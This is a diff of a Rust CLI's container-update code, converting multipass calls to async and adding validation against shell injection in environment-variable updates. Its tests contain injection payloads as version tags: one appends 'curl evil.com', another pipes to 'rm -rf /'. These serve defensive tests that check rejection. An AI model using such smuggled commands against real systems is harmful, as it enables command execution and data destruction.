@@ -256,12 +256,10 @@ fn extract_tar_content(signed_bytes: &[u8]) -> Result<Vec<u8>> {
 // ── Container update flow (issue 08) ─────────────────────────────────────────
 
 use crate::multipass::Multipass;
+use crate::workspace::COMPOSE_PATH;
 
 /// GHCR registry prefix for Polis container images.
 const GHCR_PREFIX: &str = "ghcr.io/odralabshq";
-
-/// Path to `docker-compose.yml` inside the VM.
-const COMPOSE_PATH: &str = "/opt/polis/docker-compose.yml";
 
 /// Path to the `.env` file that pins container image versions inside the VM.
 const ENV_PATH: &str = "/opt/polis/.env";
@@ -337,8 +335,11 @@ fn container_to_service_key(container_name: &str) -> &str {
 /// # Errors
 ///
 /// Returns an error if the `multipass exec` call fails unexpectedly.
-fn get_deployed_version(image_name: &str, mp: &impl Multipass) -> Result<Option<String>> {
-    let output = mp.exec(&["cat", ENV_PATH]).context("failed to read .env")?;
+async fn get_deployed_version(image_name: &str, mp: &impl Multipass) -> Result<Option<String>> {
+    let output = mp
+        .exec(&["cat", ENV_PATH])
+        .await
+        .context("failed to read .env")?;
 
     if !output.status.success() {
         return Ok(None);
@@ -363,9 +364,10 @@ fn get_deployed_version(image_name: &str, mp: &impl Multipass) -> Result<Option<
 /// # Errors
 ///
 /// Returns an error only if `multipass exec` itself cannot be spawned.
-fn pull_container_image(image_ref: &str, mp: &impl Multipass) -> Result<bool> {
+async fn pull_container_image(image_ref: &str, mp: &impl Multipass) -> Result<bool> {
     let output = mp
         .exec(&["docker", "pull", image_ref])
+        .await
         .context("failed to run multipass exec docker pull")?;
 
     Ok(output.status.success())
@@ -379,9 +381,13 @@ fn pull_container_image(image_ref: &str, mp: &impl Multipass) -> Result<bool> {
 /// # Errors
 ///
 /// Returns an error if the `multipass exec` call fails unexpectedly.
-fn capture_rollback_info(updates: &[ContainerUpdate], mp: &impl Multipass) -> Result<RollbackInfo> {
+async fn capture_rollback_info(
+    updates: &[ContainerUpdate],
+    mp: &impl Multipass,
+) -> Result<RollbackInfo> {
     let output = mp
         .exec(&["cat", ENV_PATH])
+        .await
         .context("failed to read .env for rollback")?;
     let content = if output.status.success() {
         String::from_utf8_lossy(&output.stdout).into_owned()
@@ -415,8 +421,18 @@ fn capture_rollback_info(updates: &[ContainerUpdate], mp: &impl Multipass) -> Re
 ///
 /// # Errors
 ///
-/// Returns an error if the shell command fails.
-fn set_env_var(key: &str, value: &str, mp: &impl Multipass) -> Result<()> {
+/// Returns an error if validation fails or the shell command fails.
+async fn set_env_var(key: &str, value: &str, mp: &impl Multipass) -> Result<()> {
+    // SEC-002/SEC-003: Validate inputs before shell interpolation
+    anyhow::ensure!(
+        key.chars().all(|c| c.is_ascii_alphanumeric() || c == '_'),
+        "env key contains invalid characters: {key}"
+    );
+    if !value.is_empty() {
+        validate_version_tag(value)
+            .with_context(|| format!("invalid version tag for {key}: {value}"))?;
+    }
+
     let cmd = if value.is_empty() {
         format!(
             "grep -v '^{key}=' {ENV_PATH} 2>/dev/null > {ENV_PATH}.tmp && mv {ENV_PATH}.tmp {ENV_PATH} || true"
@@ -428,6 +444,7 @@ fn set_env_var(key: &str, value: &str, mp: &impl Multipass) -> Result<()> {
     };
     let output = mp
         .exec(&["bash", "-c", &cmd])
+        .await
         .context("failed to update .env")?;
     anyhow::ensure!(
         output.status.success(),
@@ -442,12 +459,13 @@ fn set_env_var(key: &str, value: &str, mp: &impl Multipass) -> Result<()> {
 /// # Errors
 ///
 /// Returns an error if the restart command fails.
-fn restart_services(service_keys: &[&str], mp: &impl Multipass) -> Result<()> {
+async fn restart_services(service_keys: &[&str], mp: &impl Multipass) -> Result<()> {
     let mut args = vec!["docker", "compose", "-f", COMPOSE_PATH, "up", "-d"];
     args.extend_from_slice(service_keys);
 
     let output = mp
         .exec(&args)
+        .await
         .context("failed to run multipass exec docker compose up -d")?;
 
     anyhow::ensure!(
@@ -459,8 +477,11 @@ fn restart_services(service_keys: &[&str], mp: &impl Multipass) -> Result<()> {
 }
 
 /// Check whether the workspace VM is running.
-fn is_vm_running(mp: &impl Multipass) -> bool {
-    mp.vm_info().map(|o| o.status.success()).unwrap_or(false)
+async fn is_vm_running(mp: &impl Multipass) -> bool {
+    mp.vm_info()
+        .await
+        .map(|o| o.status.success())
+        .unwrap_or(false)
 }
 
 /// Compute the list of container updates by comparing the manifest against deployed versions.
@@ -468,7 +489,7 @@ fn is_vm_running(mp: &impl Multipass) -> bool {
 /// # Errors
 ///
 /// Returns an error if any version tag in the manifest fails validation.
-fn compute_container_updates(
+async fn compute_container_updates(
     manifest: &VersionsManifest,
     mp: &impl Multipass,
 ) -> Result<Vec<ContainerUpdate>> {
@@ -479,6 +500,7 @@ fn compute_container_updates(
 
         let service_key = container_to_service_key(image_name).to_string();
         let current_version = get_deployed_version(image_name, mp)
+            .await
             .unwrap_or(None)
             .unwrap_or_else(|| "unknown".to_string());
 
@@ -499,16 +521,16 @@ fn compute_container_updates(
 /// # Errors
 ///
 /// Returns an error if the VM is not running, any pull fails, or rollback fails.
-pub fn update_containers(
+pub async fn update_containers(
     manifest: &VersionsManifest,
     ctx: &OutputContext,
     mp: &impl Multipass,
 ) -> Result<()> {
-    if !is_vm_running(mp) {
+    if !is_vm_running(mp).await {
         anyhow::bail!("Workspace is not running. Start it with: polis start");
     }
 
-    let updates = compute_container_updates(manifest, mp)?;
+    let updates = compute_container_updates(manifest, mp).await?;
 
     if updates.is_empty() {
         println!(
@@ -540,19 +562,19 @@ pub fn update_containers(
     }
 
     // Capture rollback info before any changes
-    let rollback = capture_rollback_info(&updates, mp)?;
+    let rollback = capture_rollback_info(&updates, mp).await?;
 
     // Pull all images first (F-002 atomicity — no compose changes until all pulls succeed)
-    if !pull_all_images(&updates, ctx, mp)? {
+    if !pull_all_images(&updates, ctx, mp).await? {
         return Ok(());
     }
 
     // Update compose tags, restart, and rollback on failure
-    apply_updates_with_rollback(&updates, &rollback, ctx, mp)
+    apply_updates_with_rollback(&updates, &rollback, ctx, mp).await
 }
 
 /// Pull all container images. Returns `false` if any pull fails (no changes made).
-fn pull_all_images(
+async fn pull_all_images(
     updates: &[ContainerUpdate],
     ctx: &OutputContext,
     mp: &impl Multipass,
@@ -562,7 +584,7 @@ fn pull_all_images(
             println!("  Pulling {} {}...", u.image_name, u.target_version);
         }
         let image_ref = ghcr_ref(&u.image_name, &u.target_version);
-        if !pull_container_image(&image_ref, mp)? {
+        if !pull_container_image(&image_ref, mp).await? {
             println!(
                 "  Pull failed for {}:{}. No changes made.",
                 u.image_name, u.target_version
@@ -574,7 +596,7 @@ fn pull_all_images(
 }
 
 /// Apply compose tag updates, restart services, and rollback on failure (F-003).
-fn apply_updates_with_rollback(
+async fn apply_updates_with_rollback(
     updates: &[ContainerUpdate],
     rollback: &RollbackInfo,
     ctx: &OutputContext,
@@ -582,21 +604,23 @@ fn apply_updates_with_rollback(
 ) -> Result<()> {
     let service_keys: Vec<&str> = updates.iter().map(|u| u.service_key.as_str()).collect();
 
-    let apply_result = (|| -> Result<()> {
+    let apply_result = async {
         for u in updates {
-            set_env_var(&image_name_to_env_var(&u.image_name), &u.target_version, mp)?;
+            set_env_var(&image_name_to_env_var(&u.image_name), &u.target_version, mp).await?;
         }
-        restart_services(&service_keys, mp)
-    })();
+        restart_services(&service_keys, mp).await
+    }
+    .await;
 
     if let Err(e) = apply_result {
         eprintln!("  Restart failed. Rolling back...");
-        let rollback_result = (|| -> Result<()> {
+        let rollback_result = async {
             for (env_var, old_val) in &rollback.previous_refs {
-                set_env_var(env_var, old_val, mp)?;
+                set_env_var(env_var, old_val, mp).await?;
             }
-            restart_services(&service_keys, mp)
-        })();
+            restart_services(&service_keys, mp).await
+        }
+        .await;
 
         match rollback_result {
             Ok(()) => anyhow::bail!("Update rolled back: {e}"),
@@ -719,7 +743,7 @@ pub async fn run(
     }
 
     apply_cli_update(ctx, checker, cli_update)?;
-    apply_container_updates(ctx, mp)?;
+    apply_container_updates(ctx, mp).await?;
 
     println!();
     Ok(())
@@ -837,14 +861,14 @@ fn apply_cli_update(
     Ok(())
 }
 
-fn apply_container_updates(ctx: &OutputContext, mp: &impl Multipass) -> Result<()> {
+async fn apply_container_updates(ctx: &OutputContext, mp: &impl Multipass) -> Result<()> {
     println!();
     if !ctx.quiet {
         println!("  Checking service updates...");
         println!();
     }
     match load_versions_manifest() {
-        Ok(manifest) => update_containers(&manifest, ctx, mp)?,
+        Ok(manifest) => update_containers(&manifest, ctx, mp).await?,
         Err(e) => {
             eprintln!("  Warning: could not load versions manifest: {e}");
         }
@@ -1059,13 +1083,13 @@ fn perform_update(version: &str) -> Result<()> {
 mod tests {
     use super::*;
 
-    /// Stub [`Multipass`] for tests that never reach multipass calls.
-    struct StubMultipass;
-    impl Multipass for StubMultipass {
-        fn vm_info(&self) -> anyhow::Result<std::process::Output> {
+    /// Stub multipass that fails on any call (for tests that shouldn't reach multipass).
+    struct MultipassUnreachableStub;
+    impl Multipass for MultipassUnreachableStub {
+        async fn vm_info(&self) -> anyhow::Result<std::process::Output> {
             anyhow::bail!("stub: vm_info not expected")
         }
-        fn launch(
+        async fn launch(
             &self,
             _: &str,
             _: &str,
@@ -1074,16 +1098,35 @@ mod tests {
         ) -> anyhow::Result<std::process::Output> {
             anyhow::bail!("stub: launch not expected")
         }
-        fn start(&self) -> anyhow::Result<std::process::Output> {
+        async fn start(&self) -> anyhow::Result<std::process::Output> {
             anyhow::bail!("stub: start not expected")
         }
-        fn transfer(&self, _: &str, _: &str) -> anyhow::Result<std::process::Output> {
+        async fn stop(&self) -> anyhow::Result<std::process::Output> {
+            anyhow::bail!("stub: stop not expected")
+        }
+        async fn delete(&self) -> anyhow::Result<std::process::Output> {
+            anyhow::bail!("stub: delete not expected")
+        }
+        async fn purge(&self) -> anyhow::Result<std::process::Output> {
+            anyhow::bail!("stub: purge not expected")
+        }
+        async fn transfer(&self, _: &str, _: &str) -> anyhow::Result<std::process::Output> {
             anyhow::bail!("stub: transfer not expected")
         }
-        fn exec(&self, _: &[&str]) -> anyhow::Result<std::process::Output> {
+        async fn exec(&self, _: &[&str]) -> anyhow::Result<std::process::Output> {
             anyhow::bail!("stub: exec not expected")
         }
-        fn version(&self) -> anyhow::Result<std::process::Output> {
+        async fn exec_with_stdin(
+            &self,
+            _: &[&str],
+            _: &[u8],
+        ) -> anyhow::Result<std::process::Output> {
+            anyhow::bail!("stub: exec_with_stdin not expected")
+        }
+        fn exec_spawn(&self, _: &[&str]) -> anyhow::Result<tokio::process::Child> {
+            anyhow::bail!("stub: exec_spawn not expected")
+        }
+        async fn version(&self) -> anyhow::Result<std::process::Output> {
             anyhow::bail!("stub: version not expected")
         }
     }
@@ -1180,7 +1223,7 @@ mod tests {
 
         let args = UpdateArgs { check: true };
         let ctx = OutputContext::new(true, true);
-        let result = run(&args, &ctx, &AlwaysUpToDate, &StubMultipass).await;
+        let result = run(&args, &ctx, &AlwaysUpToDate, &MultipassUnreachableStub).await;
         assert!(result.is_ok());
     }
 
@@ -1207,7 +1250,7 @@ mod tests {
 
         let args = UpdateArgs { check: false };
         let ctx = OutputContext::new(true, true);
-        let result = run(&args, &ctx, &BadSignature, &StubMultipass).await;
+        let result = run(&args, &ctx, &BadSignature, &MultipassUnreachableStub).await;
         assert!(result.is_err());
         assert!(
             result.unwrap_err().to_string().contains("signature"),
@@ -1450,11 +1493,11 @@ mod tests {
         }
     }
 
-    #[test]
-    fn test_compute_container_updates_invalid_tag_returns_error() {
+    #[tokio::test]
+    async fn test_compute_container_updates_invalid_tag_returns_error() {
         // V-004: invalid version tag must be rejected before any multipass call
         let manifest = manifest_with_containers(&[("polis-gate-oss", "v0.3.1; curl evil.com")]);
-        let result = compute_container_updates(&manifest, &StubMultipass);
+        let result = compute_container_updates(&manifest, &MultipassUnreachableStub).await;
         assert!(result.is_err(), "invalid tag must return error");
         assert!(
             result
@@ -1465,17 +1508,25 @@ mod tests {
         );
     }
 
-    #[test]
-    fn test_compute_container_updates_injection_tag_returns_error() {
+    #[tokio::test]
+    async fn test_compute_container_updates_injection_tag_returns_error() {
         // V-004: shell metacharacter in tag
         let manifest = manifest_with_containers(&[("polis-gate-oss", "v0.3.0|rm -rf /")]);
-        assert!(compute_container_updates(&manifest, &StubMultipass).is_err());
+        assert!(
+            compute_container_updates(&manifest, &MultipassUnreachableStub)
+                .await
+                .is_err()
+        );
     }
 
-    #[test]
-    fn test_compute_container_updates_no_v_prefix_returns_error() {
+    #[tokio::test]
+    async fn test_compute_container_updates_no_v_prefix_returns_error() {
         let manifest = manifest_with_containers(&[("polis-gate-oss", "0.3.0")]);
-        assert!(compute_container_updates(&manifest, &StubMultipass).is_err());
+        assert!(
+            compute_container_updates(&manifest, &MultipassUnreachableStub)
+                .await
+                .is_err()
+        );
     }
 
     // -----------------------------------------------------------------------
